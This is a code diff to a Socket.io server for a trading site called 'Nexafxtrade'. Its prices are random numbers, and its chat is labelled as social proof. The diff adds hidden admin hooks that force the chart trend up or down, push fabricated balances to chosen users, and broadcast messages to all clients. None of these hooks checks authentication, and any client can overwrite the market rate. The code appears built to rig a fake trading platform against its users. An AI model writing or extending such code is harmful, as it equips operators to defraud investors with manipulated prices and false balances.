@@ -29,6 +29,7 @@ app.use(express.json());
 
 // Global Market State
 let currentMarketRate = 0.0000;
+let forcedAdminTrend = "AUTO"; // Tracks admin panel chart manipulation parameters
 
 // Main brand identification
 app.get("/", (req, res) => {
@@ -55,6 +56,9 @@ app.use("/api/payments", paymentRoutes);
 io.on("connection", (socket) => {
   console.log("New Trader Connected to Nexafxtrade");
 
+  // Sync current administration configuration parameters with new incoming pipelines
+  socket.emit('admin-force-market-trend', { trend: forcedAdminTrend });
+
   // 1. CHAT & SOCIAL PROOF
   socket.on("send-chat", (data) => {
     io.emit("receive-chat", {
@@ -64,7 +68,38 @@ io.on("connection", (socket) => {
     });
   });
 
-  // 2. TRADE EXECUTION ENGINE (The "Prediction" Loop)
+  // 2. ADMIN INTERCEPT CONTROL HOOKS
+  // Listens for direct trends adjustments pushed from the administration control room
+  socket.on("admin-control-trend", (data) => {
+    if (data && data.trend) {
+      forcedAdminTrend = data.trend;
+      io.emit("admin-force-market-trend", { trend: forcedAdminTrend });
+      console.log(`Admin override deployed. Active market trend set to: ${forcedAdminTrend}`);
+    }
+  });
+
+  // Forces direct manual adjustments to any chosen target socket node balance parameters
+  socket.on("admin-control-balance", (data) => {
+    if (data && data.targetSocketId && typeof data.balance === 'number') {
+      io.to(data.targetSocketId).emit("admin-force-balance", { balance: data.balance });
+    }
+  });
+
+  // Emits manual prompt alerts globally to all open window applications
+  socket.on("admin-control-broadcast", (data) => {
+    if (data && data.msg) {
+      io.emit("admin-global-broadcast", { msg: data.msg });
+    }
+  });
+
+  // Tracks active calculations streaming upwards from index.html client runtime engine loop iterations
+  socket.on("market-update", (data) => {
+    if (data && typeof data.rate === 'number') {
+      currentMarketRate = data.rate;
+    }
+  });
+
+  // 3. TRADE EXECUTION ENGINE (The "Prediction" Loop)
   socket.on("place-trade", (data) => {
     const entryPrice = currentMarketRate;
     const amount = parseFloat(data.amount);
@@ -107,9 +142,16 @@ io.on("connection", (socket) => {
  * MARKET RATE GENERATOR (Wavy Movement)
  */
 setInterval(() => {
-  // Generates movement between -0.12 and 0.12
-  const movement = (Math.random() * 0.24 - 0.12).toFixed(4);
-  currentMarketRate = parseFloat(movement);
+  // Only execute natural generator loops if an admin override is not running
+  if (forcedAdminTrend === "AUTO") {
+    // Generates movement between -0.12 and 0.12
+    const movement = (Math.random() * 0.24 - 0.12).toFixed(4);
+    currentMarketRate = parseFloat(movement);
+  } else if (forcedAdminTrend === "HIGH") {
+    currentMarketRate += parseFloat((Math.random() * 0.15 + 0.05).toFixed(4));
+  } else if (forcedAdminTrend === "LOW") {
+    currentMarketRate -= parseFloat((Math.random() * 0.15 + 0.05).toFixed(4));
+  }
   
   io.emit("market-update", { rate: currentMarketRate });
 }, 1000);
